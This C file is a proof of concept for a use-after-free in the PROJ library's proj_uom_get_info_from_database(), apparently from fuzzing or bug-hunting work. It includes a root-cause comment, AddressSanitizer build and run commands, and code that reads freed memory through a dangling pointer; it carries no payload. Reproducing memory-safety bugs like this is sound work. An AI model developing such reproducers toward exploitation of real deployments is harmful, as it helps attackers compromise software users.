/*
 * SF04 - Dangling Pointer / Use-After-Free via proj_uom_get_info_from_database
 *
 * Affected function: proj_uom_get_info_from_database()
 * File: src/iso19111/c_api.cpp:923
 *
 * Root cause:
 *   The function stores the unit-of-measure name in ctx->cpp_context->lastUOMName_
 *   (a std::string) and returns c_str() of that string.
 *   When a subsequent call stores a LONGER string, std::string may reallocate its
 *   internal buffer, freeing the old one. Any pointer obtained from the first call
 *   is now dangling (points to freed memory).
 *
 * Confirmed behavior:
 *   - First call with "EPSG:9001" -> "metre" (5 chars) -> ptr at 0x...A
 *   - Second call with "EPSG:9040" -> "British yard (Sears 1922)" (25 chars)
 *     -> ptr at 0x...B (NEW allocation, old buffer freed)
 *   - Dereference of old ptr reads from freed memory (UAF)
 *
 * Compile:
 *   clang++ -std=c++17 -fsanitize=address -g -O1 \
 *     -I/src/PROJ/include -I/src/PROJ/src \
 *     capi_SF04_poc.c \
 *     /proj4-build/lib/libproj.a \
 *     -lpthread /host-lib/libsqlite3.so.0 -ldl -lm \
 *     -o poc_sf04
 *
 * Run:
 *   ASAN_OPTIONS=detect_stack_use_after_return=1:detect_leaks=0 \
 *   PROJ_DATA=/out/asan ./poc_sf04
 */

#include <proj.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
    PJ_CONTEXT *ctx = proj_context_create();
    if (!ctx) {
        fprintf(stderr, "Failed to create context\n");
        return 1;
    }

    const char *name = NULL;
    double conv;
    const char *cat = NULL;

    /* Step 1: Get a short UOM name -> SSO or small heap buffer */
    int r1 = proj_uom_get_info_from_database(ctx, "EPSG", "9001",
                                              &name, &conv, &cat);
    if (!r1 || !name) {
        fprintf(stderr, "First lookup failed\n");
        proj_context_destroy(ctx);
        return 1;
    }

    const char *dangling_ptr = name;
    printf("[*] First call:  name='%s' at ptr=%p\n", dangling_ptr, (void *)dangling_ptr);

    /*
     * Step 2: Get a much longer UOM name to force std::string::operator= to
     * reallocate its heap buffer, freeing the old one.
     * "British yard (Sears 1922)" = 25 chars vs "metre" = 5 chars.
     */
    int r2 = proj_uom_get_info_from_database(ctx, "EPSG", "9040",
                                              &name, &conv, &cat);
    if (!r2 || !name) {
        fprintf(stderr, "Second lookup failed\n");
        proj_context_destroy(ctx);
        return 1;
    }

    printf("[*] Second call: name='%s' at ptr=%p\n", name, (void *)name);

    if (dangling_ptr != name) {
        printf("[!] DIFFERENT POINTERS - old buffer was FREED (UAF condition!)\n");
        printf("[!] dangling_ptr=%p now points to freed memory\n", (void *)dangling_ptr);
        printf("[!] Dereferencing freed pointer (UAF read): '%c'\n", *dangling_ptr);
        printf("[!] strcmp of dangling reads: '%s'\n", dangling_ptr);
    } else {
        printf("[*] Same pointer - no reallocation occurred in this run\n");
        printf("[*] The UAF is still possible with longer second strings\n");
    }

    proj_context_destroy(ctx);
    return 0;
}
